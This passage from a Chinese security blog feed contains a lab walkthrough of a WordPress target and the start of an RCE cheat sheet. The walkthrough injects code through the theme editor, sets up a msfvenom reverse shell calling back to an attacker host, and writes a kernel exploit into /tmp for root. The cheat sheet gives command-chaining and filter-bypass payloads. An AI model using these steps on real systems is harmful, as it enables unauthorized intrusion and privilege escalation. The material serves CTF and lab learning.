            "content_html": "<p>WordPress 渗透测试</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"搭建靶机\"><a class=\"anchor\" href=\"#搭建靶机\">#</a> 搭建靶机</h2>\n<p>打开 vmware 虚拟机创建一个 ubuntu 的虚拟机</p>\n<p>将硬盘移除，将靶机的虚拟磁盘添加进去启动即可</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603150311155.png\" alt=\"image-20230603150311155\" /></p>\n<h2 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>启动虚拟机后</p>\n<p>这里我们不知道账号密码，将靶机的网段设置和 kali 相同 (NAT 模式)</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603150402100.png\" alt=\"image-20230603150402100\" /></p>\n<p>通过 kali 的 <code>nmap</code>  工具扫出此 ip 的网段和相关信息</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-Pn</span> <span class=\"token parameter variable\">-sV</span> <span class=\"token function\">ip</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">0</span>-65535 <span class=\"token parameter variable\">--open</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230603150803903.png\" alt=\"image-20230603150803903\" /></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603151237068.png\" alt=\"image-20230603151237068\" /></p>\n<p>扫到靶机开放了两个端口  <code>443 8080</code></p>\n<h2 id=\"漏洞检测\"><a class=\"anchor\" href=\"#漏洞检测\">#</a> 漏洞检测</h2>\n<p>打开浏览器访问 <code>8080</code>  端口，进到首页后，看到个很明显的  <code>Log in</code>  关键词</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603151823868.png\" alt=\"image-20230603151823868\" /></p>\n<p>点击后来到登陆界面，惯例简单弱口令试试水，试了几个弱口令没反应，  <code>admin</code>   <code>123456</code>  就进去了 (也可爆破)</p>\n<p>进到了后台，开始找漏洞利用点</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603152402012.png\" alt=\"image-20230603152402012\" /></p>\n<h2 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>在  <code>Appearance/Editor</code>  中发现很多 php 文件，可以尝试从中插入危险函数达到我们的目的</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603152859332.png\" alt=\"image-20230603152859332\" /></p>\n<p>我们在  <code>index.php</code>  插入个 phpinfo 并保存，浏览器打开新的标签页访问一遍首页查看代码是否执行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230603153149249.png\" alt=\"image-20230603153149249\" /></p>\n<p>执行成功！</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603153435312.png\" alt=\"image-20230603153435312\" /></p>\n<p>(这个地方可以直接插入一句话 eval，直接 post 命令执行即可。这里不做演示</p>\n<p>这里我们可以使用  <code>msfvenom</code>  生成一个反弹 shell 文件，lhost 是 kali 本机 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> php/meterpreter/reverse_tcp <span class=\"token assign-left variable\">lhost</span><span class=\"token operator\">=</span>ip <span class=\"token assign-left variable\">lport</span><span class=\"token operator\">=</span>port <span class=\"token parameter variable\">-f</span> raw<span class=\"token operator\">></span>shell.php</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230603154108841.png\" alt=\"image-20230603154108841\" /></p>\n<p>将生成好的  <code>shell.php</code>  里面的内容复制下来，插入到靶机  <code>index.php</code>  配置文件里，(记得在结尾 <code>?&gt;</code>  闭合掉，以确保不会与下方的 php 代码冲突，然后保存 待定</p>\n<p>利用  <code>msfconsole</code>  工具实现反弹效果，lhost 是 kali 本机 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> use exploit/multi/handler </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Using configured payload generic/shell_reverse_tcp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> show options </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Module options <span class=\"token punctuation\">(</span>exploit/multi/handler<span class=\"token punctuation\">)</span>:</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   Name  Current Setting  Required  Description</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   ----  ---------------  --------  -----------</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Payload options <span class=\"token punctuation\">(</span>generic/shell_reverse_tcp<span class=\"token punctuation\">)</span>:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   Name   Current Setting  Required  Description</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   ----   ---------------  --------  -----------</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   LHOST                   <span class=\"token function\">yes</span>       The listen address <span class=\"token punctuation\">(</span>an interface may be specified<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   LPORT  <span class=\"token number\">4444</span>             <span class=\"token function\">yes</span>       The listen port</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Exploit target:</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   Id  Name</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   --  ----</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token number\">0</span>   Wildcard Target</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> payload php/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload <span class=\"token operator\">=</span><span class=\"token operator\">></span> php/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.16.129</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>lhost <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">192.168</span>.16.129</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">9999</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>lport <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">9999</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run</pre></td></tr></table></figure><p>设置完就运行，然后去访问一遍首页，就会反弹成功，输入 <code>shell</code>  即可输入指令</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603155124776.png\" alt=\"image-20230603155124776\" /></p>\n<p>发现当前是普通用户，需要进一步提权</p>\n<p><code>uname -a</code>  查看当前版本号</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux Kiowizity <span class=\"token number\">3.13</span>.0-45-generic <span class=\"token comment\">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span></pre></td></tr></table></figure><p>进入交互式</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230603160852107.png\" alt=\"image-20230603160852107\" /></p>\n<p>利用  <code>searchsploit</code>  工具查找 3.13.0 版本的漏洞</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603155736346.png\" alt=\"image-20230603155736346\" /></p>\n<p><code>searchsploit -p linux/local/37292.c</code>  查看绝对路径</p>\n<p>打开  <code>37292.c</code>  里面会有教你如何使用此漏洞文件</p>\n<p>将  <code>37292.c</code>  里面的内容复制下来并 base64 加密</p>\n<p>返回到靶机页面，利用 <code>file_put_contents</code>  函数将加密好的 base64 写入进靶机内部</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>?php file_put_contents<span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/123.c\"</span>,base64_decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"加密内容\"</span><span class=\"token punctuation\">))</span>?<span class=\"token operator\">></span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230603161537874.png\" alt=\"image-20230603161537874\" /></p>\n<p>保存再访问一次首页，返回 kali 成功将文件写入到 <code>/tmp</code>  下</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230603161814493.png\" alt=\"image-20230603161814493\" /></p>\n<p>然后将文件编译授权运行即可</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>daemon@Kiowizity:/tmp$ gcc <span class=\"token number\">123</span>.c <span class=\"token parameter variable\">-o</span> tiquan</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gcc <span class=\"token number\">123</span>.c <span class=\"token parameter variable\">-o</span> tiquan</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>daemon@Kiowizity:/tmp$ <span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">123</span>.c  tiquan</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>daemon@Kiowizity:/tmp$ <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> tiquan</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token number\">777</span> tiquan</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>daemon@Kiowizity:/tmp$ ./tiquan</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>./tiquan</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>spawning threads</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>child threads <span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>/etc/ld.so.preload created</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>creating shared library</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># whoami</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">whoami</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>root</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#</span></pre></td></tr></table></figure><p><code>passwd</code>  将密码修改，成功登陆靶机</p>\n<p>渗透完成</p>\n",
            "tags": [
                "靶场",
                "靶场复现"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/",
            "url": "http://k1nako.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/",
            "title": "命令执行(rce)漏洞总结",
            "date_published": "2023-05-21T12:37:47.000Z",
            "content_html": "<p>补档系列</p>\n<p><span id=\"more\"></span></p>\n<p>这是小白补档系列的第一章，命令执行。<br />\n是我之前学命令执行或在做 CTF 题时遇到的知识点<br />\n如知识点不全，还请评论告诉我～</p>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>命令执行漏洞就是黑客可以直接在 web 应用中执行系统命令，从而获取敏感信息或者拿下 shell 权限。</p>\n<h3 id=\"形成原因\"><a class=\"anchor\" href=\"#形成原因\">#</a> 形成原因</h3>\n<p>应用有时需要调用一些执行<em><strong>系统命令</strong></em>的函数，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以讲恶意系统命令拼接到正常的命令中，从而造成命令执行攻击，这就是<em><strong>命令执行漏洞</strong></em></p>\n<h3 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h3>\n<ol>\n<li>系统命令执行漏洞：传入系统命令</li>\n<li>PHP 代码执行漏洞：传入 PHP 代码</li>\n</ol>\n<h3 id=\"系统命令执行函数\"><a class=\"anchor\" href=\"#系统命令执行函数\">#</a> 系统命令执行函数</h3>\n<h4 id=\"system\"><a class=\"anchor\" href=\"#system\">#</a> system</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>执行外部程序，并且显示输出</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$result_code</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"exec\"><a class=\"anchor\" href=\"#exec\">#</a> exec</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>执行系统外部命令时不会输出结果，而是返回结果的最后一行</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$result_code</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"shell_exec\"><a class=\"anchor\" href=\"#shell_exec\">#</a> shell_exec</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>通过 shell 执行命令并将完整的输出以字符串的方式返回，实际上仅是反撇号 (`) 操作符的变体</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"passthru\"><a class=\"anchor\" href=\"#passthru\">#</a> passthru</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>​\t直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$result_code</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">?</span><span class=\"token class-name return-type\">false</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"popen\"><a class=\"anchor\" href=\"#popen\">#</a> popen</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>打开进程文件指针</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$mode</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">resource</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"proc_open\"><a class=\"anchor\" href=\"#proc_open\">#</a> proc_open</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>执行一个命令，并且打开用来输入 / 输出的文件指针。</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword type-declaration\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">string</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$descriptor_spec</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$pipes</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">?</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$cwd</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">?</span><span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$env_vars</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token operator\">?</span><span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">resource</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"pcntl_exec\"><a class=\"anchor\" href=\"#pcntl_exec\">#</a> pcntl_exec</h4>\n<ol>\n<li>\n<p>含义</p>\n<p>在当前进程空间执行指定程序</p>\n</li>\n<li>\n<p>语法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$path</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$args</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$env_vars</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"php代码执行漏洞\"><a class=\"anchor\" href=\"#php代码执行漏洞\">#</a> PHP 代码执行漏洞</h3>\n<p>在 php 语言里有一些函数将输入的字符串参数当作 php 代码执行</p>\n<h4 id=\"eval\"><a class=\"anchor\" href=\"#eval\">#</a> eval</h4>\n<p>把字符串当成 php 代码执行</p>\n<p>一句话木马的常客</p>\n<h4 id=\"preg_replace\"><a class=\"anchor\" href=\"#preg_replace\">#</a> preg_replace</h4>\n<p>执行一个正则表达式的搜索和替换</p>\n<h4 id=\"assert\"><a class=\"anchor\" href=\"#assert\">#</a> assert</h4>\n<p>检查一个断言是否为 FALSE</p>\n<p><em><strong>除此之外还有</strong></em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）</pre></td></tr></table></figure><h3 id=\"防御命令执行漏洞函数\"><a class=\"anchor\" href=\"#防御命令执行漏洞函数\">#</a> 防御命令执行漏洞函数</h3>\n<h4 id=\"escapeshellarg\"><a class=\"anchor\" href=\"#escapeshellarg\">#</a> escapeshellarg()</h4>\n<p>把字符串转码为可以在 shell 命令里使用的参数</p>\n<h4 id=\"escapeshellcmd\"><a class=\"anchor\" href=\"#escapeshellcmd\">#</a> escapeshellcmd()</h4>\n<p>转义命令中的所有 shell 元字符，# &amp;;`,|*?<span></span>~&lt;&gt;^()<span></span>{}$\\</p>\n<h3 id=\"命令拼接符号\"><a class=\"anchor\" href=\"#命令拼接符号\">#</a> 命令拼接符号</h3>\n<p>如果要问命令执行漏洞中一定要会的东西是什么，那一定是<em><strong>命令拼接符</strong></em>，因为恶意命令通常是拼接在正常命令后面，会用命令执行拼接符才是你利用<em><strong>命令执行漏洞的基础</strong></em></p>\n<h4 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h4>\n<table>\n<thead>\n<tr>\n<th><strong>拼接符</strong></th>\n<th><strong>示例</strong></th>\n<th><strong>拼接符的详解</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>&amp;</strong></td>\n<td><strong>A&amp;B</strong></td>\n<td><strong>无论 A 是 false 还是 true，B 都执行，即互不影响</strong></td>\n</tr>\n<tr>\n<td><strong>&amp;&amp;</strong></td>\n<td><strong>A&amp;&amp;B</strong></td>\n<td><strong>具有短路效果，A 是 false，B 就不执行，有短路效果</strong></td>\n</tr>\n<tr>\n<td><strong>|</strong></td>\n<td><strong>A|B</strong></td>\n<td><strong>表示 A 命令语句的输出，作为 B 命令语句的输入执行。当 A 为 false 的时候将不会执行</strong></td>\n</tr>\n<tr>\n<td><strong>||</strong></td>\n<td><strong>A||B</strong></td>\n<td><strong>表示 A 命令语句执行失败，然后才执行 B 命令语句</strong></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">拼接符</th>\n<th>拼接符的详解</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>&amp;</strong></td>\n<td><strong>使命令在后台运行，只要在命令后面跟上一个空格和 '&amp;' 你就可以运行多个命令</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>;</strong></td>\n<td><strong>可以进行多条命令的无关联执行，每一条执行结果互不影响</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>&amp;&amp;</strong></td>\n<td><strong>跟 windows 一个作用</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>||</strong></td>\n<td><strong>跟 windows 一个作用</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>()</strong></td>\n<td><strong>如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用命令组合起来</strong></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"简述\"><a class=\"anchor\" href=\"#简述\">#</a> 简述</h4>\n<p>常用的命令拼接符这里都说完了，但需要注意的是，使用时不要局限于单一个符号，层层嵌套起来会展示出不一样的效果，需要思维灵活变通，比如结合 <code>||</code>  和 <code>&amp;&amp;</code>  可以实现复杂的功能</p>\n<h3 id=\"常见的绕过方法\"><a class=\"anchor\" href=\"#常见的绕过方法\">#</a> 常见的绕过方法</h3>\n<h4 id=\"空格过滤\"><a class=\"anchor\" href=\"#空格过滤\">#</a> 空格过滤</h4>\n<ol>\n<li>\n<p><code>$&#123;IFS&#125;</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat$&#123;IFS&#125;flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure></li>\n<li>\n<p><code>$IFS$9  </code></p>\n<p>加个 $ 是为了起到截断作用，$9 只是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat$IFS$9flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure></li>\n<li>\n<p><code>%09</code></p>\n<p>（需要 PHP 环境，不作演示）</p>\n</li>\n<li>\n<p><code>&lt;</code>  或者 <code>&lt;&gt;</code>  重定向</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat&lt;flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># cat&lt;>flag</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure></li>\n<li>\n<p><code>&#123;&#125;</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># &#123;cat,flag&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure></li>\n</ol>\n<h5 id=\"例题\"><a class=\"anchor\" href=\"#例题\">#</a> 例题</h5>\n<p><strong>NSSCTF</strong></p>\n<p>[SWPUCTF 2021 新生赛] babyrce</p>\n<p>[GXYCTF 2019]Ping Ping Ping</p>\n<h4 id=\"黑名单过滤\"><a class=\"anchor\" href=\"#黑名单过滤\">#</a> 黑名单过滤</h4>\n<p>比如说过滤了 cat 或者 flag 或 php</p>\n<ol>\n<li><strong>变量拼接</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># a=c;b=at;c=fl;d=ag;$a$b $c$d</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good<span class=\"token operator\">!</span></pre></td></tr></table></figure><ol start=\"2\">\n<li><strong>单引号或双引号绕过</strong></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># ca't' f'l'ag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>you are good</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root@VM-12-9-ubuntu:/<span class=\"token comment\"># c\"a\"t 